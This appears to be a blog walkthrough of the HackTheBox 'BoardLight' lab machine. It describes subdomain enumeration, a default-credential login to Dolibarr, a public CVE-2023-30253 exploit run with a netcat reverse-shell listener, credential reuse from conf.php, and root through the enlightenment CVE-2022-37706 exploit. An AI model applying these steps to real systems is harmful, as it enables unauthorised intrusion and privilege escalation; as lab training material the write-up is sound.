Hello everyone!

Today we will explore “BoardLight”, an easy-level machine released by HackTheBox.

Without further ado, let’s get started!

![image](/HTB/BoardLight/BoardLight_images/1.png)

(ensure that you added the following line `TARGET_IP   boardlight.htb` to your local `/etc/hosts` file)

## Information Gathering

First, we will perform an aggressive **Nmap** scan to obtain comprehensive results:



![image](/HTB/BoardLight/BoardLight_images/2.png)



We can identify two running services on the target:

SSH (OpenSSH 8.2p1 | 22)

HTTP (Apache httpd 2.4.41 | 80)

We can assume from the scan that the target works on Linux.

We can inspect the website served on port 80:



![image](/HTB/BoardLight/BoardLight_images/3.png)



The website seems to host a cybersecurity prestation. We can identify a domain name at the bottom of the page:



![image](/HTB/BoardLight/BoardLight_images/4.png)



It may be useful for us. We will add it to our `/etc/hosts` file and run **ffuf** to perform subdomains enumeration:



![image](/HTB/BoardLight/BoardLight_images/5.png)



We successfully identified a valid subdomain! We will again edit `/etc/hosts` and add the crm.board.htb subdomain line to the file:



![image](/HTB/BoardLight/BoardLight_images/6.png)



We can now access the subdomain via our web browser:



![image](/HTB/BoardLight/BoardLight_images/7.png)



We now have access to a login panel! We can identify the Dolibarr 17.0.0 CMS.

Using the default credentials `admin : admin` allow us to successfully log in as the **admin** user and access the dashboard:



![image](/HTB/BoardLight/BoardLight_images/8.png)



But it seems that our access is restricted. We cannot do much there, so we looked for potential exploitsw affecting this version of Dolibarr. Searching for authenticated exploit for Dolibarr 17.0.0 led us to a [GitHub Repository](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253) which hosts a Python script matching our exact version. We can learn from the repository how to use it:

`python3 exploit.py <TARGET_HOSTNAME> <USERNAME> <PASSWORD> <LHOST> <LPORT>`

We can download the script and configure it in order to obtain a reverse shell. We will need to set up a **netcat listener** with the following command `nc -lvnp PORT`. After that, we can execute the script:



![image](/HTB/BoardLight/BoardLight_images/9.png)



And we successfully obtained initial access as **www-data**!

We can stabilize our current shell to avoid command issues with the following commands:

`python3 -c 'import pty; pty.spawn(”/bin/bash”)'`

`export TERM=xterm`

Since we gained access as a low-privileged account, we will need to pivot our access to another user. So let’s look at the `/etc/passwd` file:



![image](/HTB/BoardLight/BoardLight_images/10.png)



We can confirm that a user exists on the system: **larissa**

Can we access his personal `/home` directory?



![image](/HTB/BoardLight/BoardLight_images/11.png)



We can’t. we probably need to identify valid credentials for this user in order to retrieve the first flag.

After basic enumeration of the /var/www/html website directory, we can find an interesting `conf.php` file that contains valid database credentials:



![image](/HTB/BoardLight/BoardLight_images/12.png)



We can try to authenticate as **larissa** with the password we found if a password-reuse has occured:



![image](/HTB/BoardLight/BoardLight_images/13.png)



It works! We successfully escalated our initial low-privilege access to the user **larissa**. We can now retrieve the first flag in the `/home/larissa` directory:



![image](/HTB/BoardLight/BoardLight_images/14.png)



## Privilege Escalation

After enumerating potential privilege escalation paths, we can find an intriguing binary present on the system:



![image](/HTB/BoardLight/BoardLight_images/15.png)



We identified an `enlightenment` binary, which is not very common. After searching about potential vulnerabilities related to it, we can find a [GitHub Repository](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit) which hosts a local privilege escalation exploit matching our binary. This exploit leverages a vulnerability also known as **CVE-2022-37706** affecting enlightenment before version **0.25.4**. We can check whether our binary is out-dated with the following command:

`enlightenment --version`



![image](/HTB/BoardLight/BoardLight_images/16.png)



As we can see, our binary is vulnerable to this exploit.

We need to download the exploit from the repository and transfer it to the target via a python3 server: 



![image](/HTB/BoardLight/BoardLight_images/17.png)



We can now make it executable using the `chmod +x exploit.sh` command.

Once the script is ready, we can execute it to perform a local privilege escalation in order to obtain full access on the target:



![image](/HTB/BoardLight/BoardLight_images/18.png)



And voila! We successfully elevated our privileges to **root**. We are now able to navigate in the /root directory and retrieve the `root.txt` flag:



![image](/HTB/BoardLight/BoardLight_images/19.png)



With this we can assume that we have completely compromised the target system.



![image](/HTB/BoardLight/BoardLight_images/20.png)



## Conclusion

The BoardLight machine provides a clear and realistic walkthrough of a full penetration testing lifecycle, from initial reconnaissance to full system compromise. Starting with basic enumeration using Nmap and virtual host discovery, we were able to identify a hidden subdomain hosting a vulnerable instance of Dolibarr. This initial foothold was achieved through the exploitation of a known authenticated vulnerability, demonstrating the importance of version awareness and public exploit research during real-world assessments.

Once initial access was obtained as `www-data`, systematic enumeration of the web application and filesystem allowed us to uncover reused credentials, leading to lateral movement toward the user `larissa`. This step highlights how misconfigurations and poor credential hygiene often serve as a critical pivot point in privilege escalation paths.

Finally, the transition from user to root was achieved by identifying an outdated and vulnerable binary (`enlightenment`) affected by a known local privilege escalation vulnerability (CVE-2022-37706). Leveraging a public exploit allowed full system compromise and access to the root flag.

Overall, this machine reinforces several key penetration testing principles: thorough enumeration, attention to detail in exposed configuration files, and the value of correlating system binaries with known vulnerabilities. BoardLight is an excellent example of how chaining relatively simple weaknesses can ultimately lead to complete system takeover.

**Thank you for reading!**
